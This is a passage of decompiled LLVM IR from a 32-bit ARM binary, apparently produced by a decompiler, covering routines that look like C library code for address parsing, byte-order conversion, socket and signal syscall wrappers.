dec_label_pc_14860:
  %stack_var_-12 = alloca i32, align 4
  %v2_14868 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_14868, i32* @r1, align 4
  %v0_1486c = call i32 @function_14888()
  %v2_14870 = icmp eq i32 %v0_1486c, 0
  %v4_14874 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_14870, i32 -1, i32 %v4_14874
  ret i32 %storemerge
}

define i32 @function_14888() local_unnamed_addr {
dec_label_pc_14888:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_14888 = load i32, i32* @r4, align 4
  %v6_14888 = load i32, i32* @r5, align 4
  %v9_14888 = load i32, i32* @r6, align 4
  %v12_14888 = load i32, i32* @r7, align 4
  %v15_14888 = load i32, i32* @r8, align 4
  %v2_14890 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_14890, i32* @r4, align 4
  %v0_14894 = load i32, i32* @r0, align 4
  store i32 %v0_14894, i32* @r5, align 4
  %v0_14898 = load i32, i32* @r1, align 4
  store i32 %v0_14898, i32* @r8, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_148a8 = bitcast i32* %stack_var_-44 to i8*
  %v4_148a8 = call i32 @function_15548(i8* %v3_148a8, i32 0, i32 16)
  store i32 %v2_14890, i32* @r7, align 4
  %v2_148b0 = ptrtoint i8** %stack_var_-28 to i32
  store i32 %v2_148b0, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_148b8

dec_label_pc_148b8:                               ; preds = %dec_label_pc_14920, %dec_label_pc_14888
  store i32 %v2_148b0, i32* @r1, align 4
  %v0_148bc = load i32, i32* @r5, align 4
  store i32 %v0_148bc, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v3_148c4 = call i32 @function_1507c(i32 %v0_148bc, i32 %v2_148b0, i32 0)
  %v3_148c8 = load i8*, i8** %stack_var_-28, align 4
  %v4_148c8 = ptrtoint i8* %v3_148c8 to i32
  store i32 %v4_148c8, i32* %r1.global-to-local, align 4
  %v1_148cc = load i32, i32* @r5, align 4
  %v9_148cc = icmp eq i32 %v4_148c8, %v1_148cc
  br i1 %v9_148cc, label %dec_label_pc_1499c, label %dec_label_pc_148d4

dec_label_pc_148d4:                               ; preds = %dec_label_pc_148b8
  %v2_148d4 = load i8, i8* %v3_148c8, align 1
  %v3_148d4 = zext i8 %v2_148d4 to i32
  store i32 %v3_148d4, i32* %r2.global-to-local, align 4
  %v2_148d8 = icmp eq i8 %v2_148d4, 0
  br i1 %v2_148d8, label %dec_label_pc_148e4, label %bb

bb:                                               ; preds = %dec_label_pc_148d4
  %v8_148dc = icmp eq i8 %v2_148d4, 46
  br i1 %v8_148dc, label %dec_label_pc_148e4, label %dec_label_pc_1499c

dec_label_pc_148e4:                               ; preds = %dec_label_pc_148d4, %bb
  %v1_148e4 = inttoptr i32 %v1_148cc to i8*
  %v2_148e4 = load i8, i8* %v1_148e4, align 1
  %v3_148e4 = zext i8 %v2_148e4 to i32
  %v1_148e8 = add nsw i32 %v3_148e4, -48
  %v1_148f0 = add i32 %v4_148c8, 1
  store i32 %v1_148f0, i32* @r5, align 4
  %tmp = icmp ugt i32 %v1_148e8, 9
  br i1 %tmp, label %dec_label_pc_1499c, label %dec_label_pc_148f8

dec_label_pc_148f8:                               ; preds = %dec_label_pc_148e4
  %v1_148fc = load i32, i32* @r7, align 4
  %v2_148fc = load i32, i32* @r4, align 4
  %v5_148fc = mul i32 %v2_148fc, 4
  %v6_148fc = add i32 %v5_148fc, %v1_148fc
  %v7_148fc = inttoptr i32 %v6_148fc to i32*
  store i32 %v3_148c4, i32* %v7_148fc, align 4
  %v0_14904 = load i32, i32* @r4, align 4
  br i1 %v2_148d8, label %dec_label_pc_14904, label %dec_label_pc_14920

dec_label_pc_14904:                               ; preds = %dec_label_pc_148f8
  %v7_14904 = icmp eq i32 %v0_14904, 1
  br i1 %v7_14904, label %dec_label_pc_14940, label %dec_label_pc_1490c

dec_label_pc_1490c:                               ; preds = %dec_label_pc_14904
  %v7_1490c = icmp eq i32 %v0_14904, 2
  br i1 %v7_1490c, label %dec_label_pc_14958, label %dec_label_pc_14914

dec_label_pc_14914:                               ; preds = %dec_label_pc_1490c
  %v2_14914 = icmp eq i32 %v0_14904, 0
  br i1 %v2_14914, label %dec_label_pc_14930, label %dec_label_pc_1496c

dec_label_pc_14920:                               ; preds = %dec_label_pc_148f8
  %v1_14920 = add i32 %v0_14904, 1
  store i32 %v1_14920, i32* @r4, align 4
  %v7_14924 = icmp eq i32 %v1_14920, 4
  br i1 %v7_14924, label %dec_label_pc_1499c, label %dec_label_pc_148b8

dec_label_pc_14930:                               ; preds = %dec_label_pc_14914
  %v3_14930 = load i32, i32* %stack_var_-44, align 4
  %v3_14934 = udiv i32 %v3_14930, 16777216
  store i32 %v3_14934, i32* %r2.global-to-local, align 4
  %v1_14938 = urem i32 %v3_14930, 16777216
  store i32 %v3_14934, i32* %stack_var_-44, align 4
  br label %dec_label_pc_14940

dec_label_pc_14940:                               ; preds = %dec_label_pc_14904, %dec_label_pc_14930
  %stack_var_-40.0 = phi i32 [ %tmp6, %dec_label_pc_14904 ], [ %v1_14938, %dec_label_pc_14930 ]
  %v3_14948 = urem i32 %stack_var_-40.0, 65536
  %v3_1494c = udiv i32 %stack_var_-40.0, 65536
  store i32 %v3_1494c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14958

dec_label_pc_14958:                               ; preds = %dec_label_pc_1490c, %dec_label_pc_14940
  %stack_var_-36.0 = phi i32 [ %v3_14948, %dec_label_pc_14940 ], [ %tmp5, %dec_label_pc_1490c ]
  %v3_1495c = udiv i32 %stack_var_-36.0, 256
  store i32 %v3_1495c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1496c

dec_label_pc_1496c:                               ; preds = %dec_label_pc_14914, %dec_label_pc_14958
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v2_14890, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14974

dec_label_pc_14974:                               ; preds = %dec_label_pc_14980.dec_label_pc_14974_crit_edge, %dec_label_pc_1496c
  %v2_14980 = phi i32 [ %v1_14984, %dec_label_pc_14980.dec_label_pc_14974_crit_edge ], [ 0, %dec_label_pc_1496c ]
  %v0_14974 = phi i32 [ %v0_14974.pre, %dec_label_pc_14980.dec_label_pc_14974_crit_edge ], [ %v2_14890, %dec_label_pc_1496c ]
  %v4_14974 = mul i32 %v2_14980, 4
  %v5_14974 = add i32 %v4_14974, %v0_14974
  %v6_14974 = inttoptr i32 %v5_14974 to i32*
  %v7_14974 = load i32, i32* %v6_14974, align 4
  %tmp18 = icmp ugt i32 %v7_14974, 255
  br i1 %tmp18, label %dec_label_pc_1499c, label %dec_label_pc_14980

dec_label_pc_14980:                               ; preds = %dec_label_pc_14974
  %v1_14980 = trunc i32 %v7_14974 to i8
  %v3_14980 = load i32, i32* @r8, align 4
  %v4_14980 = add i32 %v3_14980, %v2_14980
  %v5_14980 = inttoptr i32 %v4_14980 to i8*
  store i8 %v1_14980, i8* %v5_14980, align 1
  %v0_14984 = load i32, i32* %r2.global-to-local, align 4
  %v1_14984 = add i32 %v0_14984, 1
  store i32 %v1_14984, i32* %r2.global-to-local, align 4
  %v7_14988 = icmp eq i32 %v1_14984, 4
  br i1 %v7_14988, label %dec_label_pc_1499c, label %dec_label_pc_14980.dec_label_pc_14974_crit_edge

dec_label_pc_14980.dec_label_pc_14974_crit_edge:  ; preds = %dec_label_pc_14980
  %v0_14974.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14974

dec_label_pc_1499c:                               ; preds = %dec_label_pc_148b8, %dec_label_pc_148e4, %dec_label_pc_14920, %bb, %dec_label_pc_14974, %dec_label_pc_14980
  %storemerge = phi i32 [ 1, %dec_label_pc_14980 ], [ 0, %dec_label_pc_14974 ], [ 0, %bb ], [ 0, %dec_label_pc_14920 ], [ 0, %dec_label_pc_148e4 ], [ 0, %dec_label_pc_148b8 ]
  store i32 %v3_14888, i32* @r4, align 4
  store i32 %v6_14888, i32* @r5, align 4
  store i32 %v9_14888, i32* @r6, align 4
  store i32 %v12_14888, i32* @r7, align 4
  store i32 %v15_14888, i32* @r8, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_14984, { 1, 2, 0 }
  uselistorder i32 %v7_14974, { 1, 0 }
  uselistorder i32 %v3_14934, { 1, 0 }
  uselistorder i32 %v3_14930, { 1, 0 }
  uselistorder i32 %v0_14904, { 3, 0, 1, 2 }
  uselistorder i32 %v2_148b0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-28, { 1, 0 }
  uselistorder i8 46, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_1499c, { 5, 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1496c, { 1, 0 }
  uselistorder label %dec_label_pc_14958, { 1, 0 }
  uselistorder label %dec_label_pc_14940, { 1, 0 }
  uselistorder label %dec_label_pc_148e4, { 1, 0 }
}

define i32 @function_149a8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_149a8:
  store i32 0, i32* @r2, align 4
  %v3_149ac = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v0_149c4 = call i32 @function_13178()
  store i32 %v3_149ac, i32* @r4, align 4
  ret i32 %v0_149c4
}

define i32 @function_149d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_149d0:
  %v2_149ec = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_149ec
}

define i32 @function_149f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_149f4:
  %v3_149f4 = udiv i32 %arg1, 256
  %v4_149f8 = mul i32 %arg1, 256
  %v5_149f8 = or i32 %v4_149f8, %v3_149f4
  %v3_14a00 = urem i32 %v5_149f8, 65536
  ret i32 %v3_14a00
}

define i32 @function_14a08(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14a08:
  %v0_14a1c = call i32 @function_14a2c()
  ret i32 %v0_14a1c

; uselistorder directives
  uselistorder i32 ()* @function_14a2c, { 1, 0, 3, 2 }
}

define i32 @function_14a2c() local_unnamed_addr {
dec_label_pc_14a2c:
  %v0_14a2c = load i32, i32* @lr, align 4
  %v0_14a30 = load i32, i32* @r1, align 4
  %v0_14a38 = load i32, i32* @r2, align 4
  store i32 %v0_14a38, i32* @lr, align 4
  store i32 %v0_14a30, i32* @r2, align 4
  %v0_14a4c = load i32, i32* @r0, align 4
  store i32 %v0_14a4c, i32* @r1, align 4
  store i32 %v0_14a38, i32* @r3, align 4
  %v3_14a60 = call i32 @function_15754(i32 292, i32 %v0_14a4c, i32 %v0_14a30)
  store i32 %v3_14a60, i32* @r0, align 4
  %v0_14a64 = call i32 @function_13178()
  store i32 %v0_14a2c, i32* @lr, align 4
  ret i32 %v0_14a64
}

define i32 @function_14a74(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14a74:
  %v0_14a88 = call i32 @function_14a98()
  ret i32 %v0_14a88

; uselistorder directives
  uselistorder i32 ()* @function_14a98, { 1, 0, 9, 8, 7, 6, 5, 4, 3, 2 }
}

define i32 @function_14a98() local_unnamed_addr {
dec_label_pc_14a98:
  %v0_14a98 = load i32, i32* @lr, align 4
  %v0_14a9c = load i32, i32* @r1, align 4
  %v0_14aa4 = load i32, i32* @r2, align 4
  store i32 %v0_14aa4, i32* @lr, align 4
  store i32 %v0_14a9c, i32* @r2, align 4
  %v0_14ab8 = load i32, i32* @r0, align 4
  store i32 %v0_14ab8, i32* @r1, align 4
  store i32 %v0_14aa4, i32* @r3, align 4
  %v3_14acc = call i32 @function_15754(i32 290, i32 %v0_14ab8, i32 %v0_14a9c)
  store i32 %v3_14acc, i32* @r0, align 4
  %v0_14ad0 = call i32 @function_13178()
  store i32 %v0_14a98, i32* @lr, align 4
  ret i32 %v0_14ad0
}

define i32 @function_14ae4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14ae4:
  %v3_14ae4 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_14af8 = call i32 @function_13178()
  store i32 %v3_14ae4, i32* @r4, align 4
  ret i32 %v0_14af8
}

define i32 @function_14b04(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14b04:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_14b04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14b04, label %bb, label %dec_label_pc_14b04._crit_edge

bb:                                               ; preds = %dec_label_pc_14b04
  %v1_14b04 = load i32, i32* %r0.global-to-local, align 4
  %v2_14b04 = load i32, i32* @r6, align 4
  %v5_14b04 = udiv i32 %v2_14b04, 4
  %v6_14b04 = and i32 %v5_14b04, %v1_14b04
  store i32 %v6_14b04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b04._crit_edge

dec_label_pc_14b04._crit_edge:                    ; preds = %dec_label_pc_14b04, %bb
  store i32 %arg2, i32* %r0.global-to-local, align 4
  ret i32 %arg2

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_14b04._crit_edge, { 1, 0 }
}

define i32 @function_14b28(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14b28:
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  ret i32 %arg2
}

define i32 @function_14b54(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14b54:
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v3_14b54 = load i32, i32* @r4, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v7_14b88 = call i32 @function_14b28(i32 281, i32 %arg1, i32 %arg2, i32 %arg3, i32 0, i32 0, i32 0)
  store i32 %v7_14b88, i32* @r0, align 4
  %v0_14b8c = call i32 @function_13178()
  %v1_14b90 = icmp slt i32 %v0_14b8c, 0
  br i1 %v1_14b90, label %dec_label_pc_14b98, label %dec_label_pc_14c34

dec_label_pc_14b98:                               ; preds = %dec_label_pc_14b54
  %v0_14b98 = call i32 @function_12ecc()
  %v1_14b9c = inttoptr i32 %v0_14b98 to i32*
  %v2_14b9c = load i32, i32* %v1_14b9c, align 4
  %v7_14ba0 = icmp eq i32 %v2_14b9c, 22
  br i1 %v7_14ba0, label %dec_label_pc_14bb8, label %dec_label_pc_14ba8

dec_label_pc_14ba8:                               ; preds = %dec_label_pc_14b98
  %v0_14ba8 = call i32 @function_12ecc()
  %v1_14bac = inttoptr i32 %v0_14ba8 to i32*
  %v2_14bac = load i32, i32* %v1_14bac, align 4
  store i32 %v2_14bac, i32* @r3, align 4
  %v7_14bb0 = icmp eq i32 %v2_14bac, 93
  br i1 %v7_14bb0, label %dec_label_pc_14bb8, label %dec_label_pc_14c34

dec_label_pc_14bb8:                               ; preds = %dec_label_pc_14ba8, %dec_label_pc_14b98
  %v0_14bbc = load i32, i32* %r5.global-to-local, align 4
  %v2_14bbc = and i32 %v0_14bbc, 526336
  store i32 %v2_14bbc, i32* @r3, align 4
  %v2_14bc0 = icmp eq i32 %v2_14bbc, 0
  br i1 %v2_14bc0, label %dec_label_pc_14c34, label %dec_label_pc_14bc8

dec_label_pc_14bc8:                               ; preds = %dec_label_pc_14bb8
  %v0_14bcc = load i32, i32* %r7.global-to-local, align 4
  %v1_14bd0 = and i32 %v0_14bbc, -526337
  %v0_14bd4 = load i32, i32* %r8.global-to-local, align 4
  %v0_14bdc = load i32, i32* @r4, align 4
  %v7_14be8 = call i32 @function_14b28(i32 281, i32 %v0_14bcc, i32 %v1_14bd0, i32 %v0_14bd4, i32 %v0_14bdc, i32 %v0_14bdc, i32 %v0_14bdc)
  store i32 %v7_14be8, i32* @r0, align 4
  %v0_14bec = call i32 @function_13178()
  %v1_14bf0 = icmp slt i32 %v0_14bec, 0
  br i1 %v1_14bf0, label %dec_label_pc_14c34, label %dec_label_pc_14bf8

dec_label_pc_14bf8:                               ; preds = %dec_label_pc_14bc8
  %v0_14bf8 = load i32, i32* %r5.global-to-local, align 4
  %v1_14bf8 = and i32 %v0_14bf8, 524288
  %v2_14bf8 = icmp eq i32 %v1_14bf8, 0
  br i1 %v2_14bf8, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_14bf8
  store i32 1, i32* @r3, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14bf8, %bb
  %v1_14c0c = xor i1 %v2_14bf8, true
  call void @__pseudo_cond_branch(i1 %v1_14c0c, i32 ptrtoint (i32* @global_var_14b08.597 to i32))
  %v0_14c10 = load i32, i32* %r5.global-to-local, align 4
  %v1_14c10 = and i32 %v0_14c10, 2048
  %v2_14c10 = icmp eq i32 %v1_14c10, 0
  br i1 %v2_14c10, label %.thread5, label %bb15

bb15:                                             ; preds = %.thread2
  store i32 2048, i32* @r3, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread2, %bb15
  %v1_14c24 = xor i1 %v2_14c10, true
  call void @__pseudo_cond_branch(i1 %v1_14c24, i32 ptrtoint (i32* @global_var_14b08.597 to i32))
  br label %dec_label_pc_14c34

dec_label_pc_14c34:                               ; preds = %dec_label_pc_14bb8, %dec_label_pc_14b54, %dec_label_pc_14ba8, %.thread5, %dec_label_pc_14bc8
  %storemerge.in = phi i32* [ @r4, %dec_label_pc_14bc8 ], [ @r4, %.thread5 ], [ @r6, %dec_label_pc_14ba8 ], [ @r6, %dec_label_pc_14b54 ], [ @r6, %dec_label_pc_14bb8 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %v3_14b54, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 524288, { 6, 3, 0, 1, 2, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_14b28, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14c34, { 3, 4, 0, 2, 1 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14c40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14c40:
  %v0_14c40 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14c40, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14c40
  %v2_14c40 = load i32, i32* @sb, align 4
  %v8_14c40 = shl i32 %v2_14c40, %arg2
  %v9_14c40 = and i32 %v8_14c40, %arg1
  %v1_14c44 = load i32, i32* @r8, align 4
  %v5_14c44 = mul i32 %v9_14c40, 65536
  %v6_14c44 = and i32 %v5_14c44, %v1_14c44
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14c40, %bb
  %v7_14c44 = phi i32 [ %arg1, %dec_label_pc_14c40 ], [ %v6_14c44, %bb ]
  ret i32 %v7_14c44

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14c48() local_unnamed_addr {
dec_label_pc_14c48:
  %v1_14c48 = load i32, i32* @r0, align 4
  ret i32 %v1_14c48
}

define i32 @function_14c4c() local_unnamed_addr {
dec_label_pc_14c4c:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %v15_14c4c = load i32, i32* @lr, align 4
  store i32 -1, i32* @r0, align 4
  %v2_14c54 = ptrtoint i32* %stack_var_-152 to i32
  %v1_14c60 = call i32 @function_14c48()
  %v1_14c6c = call i32 @function_14d40(i32 %v2_14c54)
  store i32 %v1_14c6c, i32* @r0, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v0_14c78 = call i32 @function_13178()
  store i32 %v0_14c78, i32* %r4.global-to-local, align 4
  %v2_14c7c = icmp eq i32 %v0_14c78, 0
  br i1 %v2_14c7c, label %dec_label_pc_14c84, label %dec_label_pc_14ca8

dec_label_pc_14c84:                               ; preds = %dec_label_pc_14c4c
  %v0_14c84 = call i32 @function_15d60()
  store i32 %v0_14c84, i32* %r2.global-to-local, align 4
  %v0_14c8c = load i32, i32* %r7.global-to-local, align 4
  %v1_14c8c = add i32 %v0_14c8c, 222
  store i32 %v1_14c8c, i32* %r7.global-to-local, align 4
  %v2_14c98 = add i32 %v0_14c84, -176
  %v3_14c98 = inttoptr i32 %v2_14c98 to i32*
  store i32 %v0_14c84, i32* %v3_14c98, align 4
  %v0_14c9c = load i32, i32* %r4.global-to-local, align 4
  %v1_14c9c = load i32, i32* %r2.global-to-local, align 4
  %v2_14c9c = add i32 %v1_14c9c, -60
  %v3_14c9c = inttoptr i32 %v2_14c9c to i32*
  store i32 %v0_14c9c, i32* %v3_14c9c, align 4
  %v0_14ca0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ca0 = load i32, i32* %r2.global-to-local, align 4
  %v2_14ca0 = add i32 %v1_14ca0, -64
  %v3_14ca0 = inttoptr i32 %v2_14ca0 to i32*
  store i32 %v0_14ca0, i32* %v3_14ca0, align 4
  %v0_14ca4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14ca4, i32* @global_var_22ae8.558, align 4
  br label %dec_label_pc_14ca8

dec_label_pc_14ca8:                               ; preds = %dec_label_pc_14c4c, %dec_label_pc_14c84
  %v1_14cac = call i32 @function_14da8(i32 %v2_14c54)
  %v0_14cb0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14cb0 = sub i32 1, %v0_14cb0
  %v2_14cb0 = icmp ult i32 %v0_14cb0, 2
  br i1 %v2_14cb0, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_14ca8
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_14ca8, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14cb0, %dec_label_pc_14ca8 ]
  store i32 %storemerge, i32* @r0, align 4
  %v1_14cbc = call i32 @function_14c48()
  %v0_14cc0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v15_14c4c, i32* @lr, align 4
  ret i32 %v0_14cc0

; uselistorder directives
  uselistorder i32 -64, { 2, 0, 1 }
  uselistorder i32 222, { 1, 0 }
  uselistorder i32 ()* @function_14c48, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_14ca8, { 1, 0 }
}

define i32 @function_14cd8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14cd8:
  %v0_14cd8 = load i32, i32* @lr, align 4
  store i32 %arg3, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg3, i32* @r3, align 4
  %v3_14d08 = call i32 @function_15754(i32 142, i32 %arg1, i32 %arg2)
  store i32 %v3_14d08, i32* @r0, align 4
  %v0_14d0c = call i32 @function_13178()
  store i32 %v0_14cd8, i32* @lr, align 4
  ret i32 %v0_14d0c
}

define i32 @function_14d1c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14d1c:
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  ret i32 %arg2
}

define i32 @function_14d40(i32 %arg1) local_unnamed_addr {
dec_label_pc_14d40:
  %v5_14d60 = call i32 @function_14d1c(i32 175, i32 0, i32 ptrtoint (i32* @global_var_19fb0.602 to i32), i32 %arg1, i32 8)
  ret i32 %v5_14d60
}

define i32 @function_14d74(i32 %arg1) local_unnamed_addr {
dec_label_pc_14d74:
  %v5_14d94 = call i32 @function_14d1c(i32 175, i32 0, i32 ptrtoint (i32* @global_var_19fa8.604 to i32), i32 %arg1, i32 8)
  ret i32 %v5_14d94
}

define i32 @function_14da8(i32 %arg1) local_unnamed_addr {
dec_label_pc_14da8:
  store i32 8, i32* @ip, align 4
  %v5_14dc8 = call i32 @function_14d1c(i32 175, i32 2, i32 %arg1, i32 0, i32 8)
  ret i32 %v5_14dc8

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_14d1c, { 1, 0, 2 }
}

define i32 @function_14dd8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14dd8:
  %v0_14de4 = call i32 @function_13178()
  ret i32 %v0_14de4
}

define i32 @function_14df0(i32 %arg1) local_unnamed_addr {
dec_label_pc_14df0:
  %stack_var_-144 = alloca i32, align 4
  %v3_14df0 = load i32, i32* @r4, align 4
  %v2_14df4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %arg1, i32* @r4, align 4
  %v1_14e04 = call i32 @function_14d74(i32 %v2_14df4)
  store i32 %v1_14e04, i32* @r0, align 4
  %v0_14e1c = call i32 @function_13178()
  %v1_14e28 = call i32 @function_14da8(i32 %v2_14df4)
  store i32 %v3_14df0, i32* @r4, align 4
  ret i32 %v0_14e1c
}

define i32 @function_14e3c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14e3c:
  %r2.global-to-local = alloca i32, align 4
  %v1_14e44 = add i32 %arg2, -1
  %tmp = icmp ugt i32 %v1_14e44, 63
  br i1 %tmp, label %dec_label_pc_14e64, label %dec_label_pc_14e58

dec_label_pc_14e58:                               ; preds = %dec_label_pc_14e3c
  %v1_14e58 = add i32 %arg2, -32
  %tmp4 = icmp ugt i32 %v1_14e58, 2
  br i1 %tmp4, label %dec_label_pc_14e78, label %dec_label_pc_14e64

dec_label_pc_14e64:                               ; preds = %dec_label_pc_14e58, %dec_label_pc_14e3c
  %v0_14e64 = call i32 @function_12ecc()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14e70 = inttoptr i32 %v0_14e64 to i32*
  store i32 22, i32* %v2_14e70, align 4
  %v0_14e94.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14e94

dec_label_pc_14e78:                               ; preds = %dec_label_pc_14e58
  %v3_14e78 = udiv i32 %v1_14e44, 32
  %v4_14e7c = mul nuw nsw i32 %v3_14e78, 4
  %v5_14e7c = add i32 %v4_14e7c, %arg1
  %v6_14e7c = inttoptr i32 %v5_14e7c to i32*
  %v7_14e7c = load i32, i32* %v6_14e7c, align 4
  %v1_14e84 = urem i32 %v1_14e44, 32
  %v7_14e88 = shl i32 1, %v1_14e84
  %v8_14e88 = or i32 %v7_14e7c, %v7_14e88
  store i32 %v8_14e88, i32* %v6_14e7c, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14e94

dec_label_pc_14e94:                               ; preds = %dec_label_pc_14e64, %dec_label_pc_14e78
  %v0_14e94 = phi i32 [ %v0_14e94.pre, %dec_label_pc_14e64 ], [ 0, %dec_label_pc_14e78 ]
  ret i32 %v0_14e94

; uselistorder directives
  uselistorder i32 %v1_14e44, { 2, 1, 0 }
  uselistorder i32 63, { 0, 7, 5, 4, 8, 1, 10, 2, 9, 3, 11, 6 }
  uselistorder label %dec_label_pc_14e94, { 1, 0 }
}

define i32 @function_14ea4(i32* %arg1) local_unnamed_addr {
dec_label_pc_14ea4:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_14eac = add i32 %tmp, 4
  %v3_14eac = inttoptr i32 %v2_14eac to i32*
  store i32 0, i32* %v3_14eac, align 4
  %v1_14eb0 = load i32, i32* %r3.global-to-local, align 4
  %v2_14eb0 = inttoptr i32 %v1_14eb0 to i32*
  store i32 0, i32* %v2_14eb0, align 4
  ret i32 0
}

define i32 @function_14eb8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14eb8:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v6_14eb8 = load i32, i32* @r5, align 4
  %v9_14eb8 = load i32, i32* @r6, align 4
  %v2_14ebc = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  %v3_14ed4 = bitcast i32* %stack_var_-296 to i8*
  %v4_14ed4 = call i32 @function_15548(i8* %v3_14ed4, i32 0, i32 140)
  %v0_14edc = load i32, i32* @r5, align 4
  store i32 %v2_14ebc, i32* @r1, align 4
  %v2_14ee4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_14ee4, i32* @r2, align 4
  %v0_14ee8 = load i32, i32* @r6, align 4
  store i32 %v0_14ee8, i32* %stack_var_-296, align 4
  %v5_14ef0 = call i32 @function_16ea0(i32 %v0_14edc, i32 %v2_14ebc, i32 %v2_14ee4, i32 268435456, i32 %v0_14ee8)
  %v1_14ef4 = icmp slt i32 %v5_14ef0, 0
  br i1 %v1_14ef4, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_14eb8
  %v6_14ef8 = load i32, i32* %stack_var_-156, align 4
